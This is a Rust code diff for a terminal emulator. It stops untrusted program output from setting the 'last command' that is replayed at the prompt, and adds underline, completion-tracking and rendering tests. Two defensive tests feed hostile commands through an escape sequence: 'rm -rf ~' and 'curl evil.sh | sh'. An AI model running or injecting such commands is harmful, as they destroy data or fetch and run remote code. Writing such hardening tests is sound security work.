@@ -396,7 +396,18 @@ impl VteHandler {
                         term.dirty.store(true, std::sync::atomic::Ordering::Relaxed);
                     }
                     TermOp::SetLastCommand(cmd) => {
-                        term.last_command = Some(cmd);
+                        // Outside the shell's own report window this is a program
+                        // writing to its own tty, not the shell naming what it is
+                        // about to run — see `last_command_slot_open`.
+                        if term.last_command_slot_open {
+                            term.last_command_slot_open = false;
+                            term.last_command = Some(cmd);
+                        } else {
+                            log::debug!(
+                                "Ignoring OSC 7777 outside a command start (terminal {})",
+                                term.terminal_id
+                            );
+                        }
                     }
                     TermOp::SetHyperlink(url) => {
                         term.set_hyperlink(url);
@@ -404,6 +415,9 @@ impl VteHandler {
                     TermOp::CommandStarted => {
                         log::debug!("OSC 133;C command started (terminal {})", term.terminal_id);
                         term.osc133_primed = true;
+                        // The shell names the command it just started in the very
+                        // next OSC 7777; nothing else gets to fill that slot.
+                        term.last_command_slot_open = true;
                         term.command_completed.store(false, std::sync::atomic::Ordering::Relaxed);
                         term.command_running.store(true, std::sync::atomic::Ordering::Relaxed);
                     }
@@ -415,6 +429,8 @@ impl VteHandler {
                         // must still fire: the startup D already primed us.
                         if term.osc133_primed {
                             term.command_completed.store(true, std::sync::atomic::Ordering::Relaxed);
+                            // Fresh completion — unread until the pane is looked at.
+                            term.completion_seen.store(false, std::sync::atomic::Ordering::Relaxed);
                             term.dirty.store(true, std::sync::atomic::Ordering::Relaxed);
                         } else {
                             term.osc133_primed = true;
@@ -713,8 +729,14 @@ impl Perform for VteHandler {
                         [head @ (38 | 48), 5, idx, ..] => {
                             flat.extend_from_slice(&[*head, 5, *idx]);
                         }
-                        // Unsupported attribute with subparams (4:x underline
-                        // styles, 58/59 underline color): drop the whole group
+                        // Underline styles (4:0 off, 4:1..4:5 single/double/
+                        // curly/dotted/dashed): we render one underline style,
+                        // so collapse to plain 4 (on) / 24 (off).
+                        [4, sub @ ..] => {
+                            flat.push(if sub == [0] { 24 } else { 4 });
+                        }
+                        // Unsupported attribute with subparams (58/59 underline
+                        // color): drop the whole group
                         _ => {}
                     }
                 }
@@ -952,6 +974,45 @@ mod tests {
         term
     }
 
+    /// Feed more bytes into an existing terminal (all parser state that matters
+    /// across chunks lives on `TerminalState`, so a fresh handler is fine).
+    fn feed(term: &Arc<RwLock<TerminalState>>, bytes: &[u8]) {
+        let devnull = std::fs::OpenOptions::new()
+            .write(true)
+            .open("/dev/null")
+            .unwrap();
+        let writer: Arc<OwnedFd> = Arc::new(devnull.into());
+        let mut parser = vte::Parser::new();
+        let mut handler = VteHandler::new(term.clone(), writer);
+        parser.advance(&mut handler, bytes);
+        handler.apply_ops();
+    }
+
+    #[test]
+    fn only_the_shell_report_right_after_a_command_start_names_the_command() {
+        // What the shell integration sends on preexec: the start marker, then the
+        // command line it is about to run.
+        let term = drive(20, 5, &[b"\x1b]133;C\x07\x1b]7777;npm run dev\x07"]);
+        assert_eq!(term.read().last_command.as_deref(), Some("npm run dev"));
+
+        // Now the command runs, and its own output prints an OSC 7777 of its
+        // choosing. It is replayed at the prompt on the next launch, so it must
+        // not be taken: nothing here came from the shell.
+        feed(&term, b"\x1b]7777;rm -rf ~\x07");
+        assert_eq!(term.read().last_command.as_deref(), Some("npm run dev"));
+
+        // The next command opens the slot again.
+        feed(&term, b"\x1b]133;C\x07\x1b]7777;ls\x07");
+        assert_eq!(term.read().last_command.as_deref(), Some("ls"));
+    }
+
+    #[test]
+    fn an_osc_7777_with_no_command_start_at_all_is_ignored() {
+        // A pane at a shell without the integration, catting a hostile file.
+        let term = drive(20, 5, &[b"\x1b]7777;curl evil.sh | sh\x07"]);
+        assert_eq!(term.read().last_command, None);
+    }
+
     fn cell(term: &Arc<RwLock<TerminalState>>, row: usize, col: usize) -> crate::terminal::Cell {
         term.read().visible_lines()[row][col].clone()
     }
@@ -963,6 +1024,17 @@ mod tests {
         let red = AnsiColor::from_index(1).to_rgb();
         assert_eq!(cell(&t, 0, 0).fg, red);
         assert_eq!(cell(&t, 0, 1).fg, red, "4:0 must not reset the red foreground");
+    }
+
+    #[test]
+    fn sgr_colon_underline_style_collapses_to_plain_underline() {
+        use crate::terminal::CellAttrs;
+        // 4:3 (curly) and 4:0 (off) ITU forms map to plain underline on/off;
+        // plain 4 also underlines.
+        let t = drive(20, 5, &[b"\x1b[4:3mA\x1b[4:0mB\x1b[4mC"]);
+        assert!(cell(&t, 0, 0).attrs.contains(CellAttrs::UNDERLINE), "4:3 underlines A");
+        assert!(!cell(&t, 0, 1).attrs.contains(CellAttrs::UNDERLINE), "4:0 turns it off for B");
+        assert!(cell(&t, 0, 2).attrs.contains(CellAttrs::UNDERLINE), "plain 4 underlines C");
     }
 
     #[test]
@@ -1039,6 +1111,28 @@ mod tests {
         let t = drive(20, 5, &[b"\x1b]133;C\x07\x1b]133;D\x07"]);
         assert!(t.read().command_completed.load(std::sync::atomic::Ordering::Relaxed));
         assert!(!t.read().command_running.load(std::sync::atomic::Ordering::Relaxed));
+    }
+
+    #[test]
+    fn ack_hides_the_dot_but_keeps_the_ipc_flag() {
+        // A completed command is unread until the pane is looked at.
+        let t = drive(20, 5, &[b"\x1b]133;C\x07\x1b]133;D\x07"]);
+        assert!(t.read().unread_completion(), "fresh completion must be unread");
+
+        // Looking at the pane acks it: no more dot, but wait-for-completion
+        // still sees the sticky flag.
+        t.read().ack_completion();
+        assert!(!t.read().unread_completion(), "acked completion must not light a dot");
+        assert!(
+            t.read().command_completed.load(std::sync::atomic::Ordering::Relaxed),
+            "ack must not consume the IPC flag"
+        );
+
+        // The next completion re-arms the dot.
+        feed(&t, b"\x1b]133;C\x07");
+        assert!(!t.read().unread_completion(), "a running command has nothing to report");
+        feed(&t, b"\x1b]133;D\x07");
+        assert!(t.read().unread_completion(), "a new completion must be unread again");
     }
 
     #[test]
@@ -1212,6 +1306,38 @@ mod tests {
     ///   KOVA_REPLAY_COLS=85 KOVA_REPLAY_ROWS=65 \
     ///   cargo test replay_capture_file -- --ignored --nocapture
     ///
+    /// The hole signature, distilled from cap_19.raw (round 5, 2026-07-24):
+    /// when the winsize flaps A→B→A quickly (Kova's repaint nudge), Claude
+    /// Code can answer with `CSI 2J` (full clear) followed by a PARTIAL
+    /// differential frame that jumps over the middle rows (`CSI 44 B`),
+    /// believing they still hold the previous content. Any terminal renders a
+    /// permanent blank band. This test pins the detector both ways: full
+    /// repaint → no band; clear + partial repaint → band, exactly where the
+    /// skipped rows are.
+    #[test]
+    fn cleared_screen_plus_partial_repaint_leaves_interior_band() {
+        let mut full = String::from("\x1b[?1049h\x1b[2J\x1b[H");
+        for i in 0..65 {
+            full.push_str(&format!("\x1b[{};1Hline {}", i + 1, i));
+        }
+        let t = drive(89, 65, &[full.as_bytes()]);
+        assert_eq!(t.read().interior_blank_band(3), None);
+
+        // The broken frame: clear all, repaint only rows 0..6 and 55..64.
+        let mut broken = String::from("\x1b[2J\x1b[H");
+        for i in 0..6 {
+            broken.push_str(&format!("\x1b[{};1Htop {}", i + 1, i));
+        }
+        broken.push_str("\r\x1b[49B");
+        for i in 55..65 {
+            broken.push_str(&format!("\x1b[{};1Hbottom {}", i + 1, i));
+        }
+        let t = drive(89, 65, &[full.as_bytes(), broken.as_bytes()]);
+        let term = t.read();
+        assert!(term.in_alt_screen);
+        assert_eq!(term.interior_blank_band(8), Some((6, 54)));
+    }
+
     /// Prints the final grid with row numbers, the cursor position, and any
     /// interior blank band (the "hole" signature). Bytes are fed in 4096-byte
     /// chunks, like the live PTY reader. For a rotated capture, replay the
@@ -1227,7 +1353,12 @@ mod tests {
         };
         let cols: u16 = std::env::var("KOVA_REPLAY_COLS").ok().and_then(|v| v.parse().ok()).unwrap_or(85);
         let rows: u16 = std::env::var("KOVA_REPLAY_ROWS").ok().and_then(|v| v.parse().ok()).unwrap_or(65);
-        let bytes = std::fs::read(&path).unwrap_or_else(|e| panic!("cannot read {}: {}", path, e));
+        let mut bytes = std::fs::read(&path).unwrap_or_else(|e| panic!("cannot read {}: {}", path, e));
+        // Bisection knob: truncate the stream to the first N bytes.
+        if let Some(n) = std::env::var("KOVA_REPLAY_BYTES").ok().and_then(|v| v.parse::<usize>().ok()) {
+            bytes.truncate(n);
+        }
+        let quiet = std::env::var("KOVA_REPLAY_QUIET").is_ok();
         let chunks: Vec<&[u8]> = bytes.chunks(4096).collect();
         let t = drive(cols, rows, &chunks);
         let term = t.read();
@@ -1241,8 +1372,10 @@ mod tests {
             "cursor: row={} col={} alt_screen={} scrollback={}",
             term.cursor_y, term.cursor_x, term.in_alt_screen, term.scrollback_len()
         );
-        for (i, l) in texts.iter().enumerate() {
-            println!("{:>3} |{}", i, l);
+        if !quiet {
+            for (i, l) in texts.iter().enumerate() {
+                println!("{:>3} |{}", i, l);
+            }
         }
         let nonblank: Vec<usize> = texts
             .iter()
